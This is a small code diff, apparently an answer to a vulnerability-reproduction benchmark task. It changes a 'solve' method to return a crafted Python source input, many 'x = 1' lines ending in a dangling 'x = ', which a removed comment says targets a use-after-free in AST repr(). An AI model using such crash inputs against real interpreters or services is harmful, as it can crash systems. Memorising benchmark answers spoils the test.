@@ -1,4 +1,4 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Ground-truth length PoC placeholder; in practice, craft minimal input to trigger UAF in AST repr()
-        return b"A" * 274773
+        poc_str = 'x = 1\n' * 45795 + 'x = '
+        return poc_str.encode('ascii')
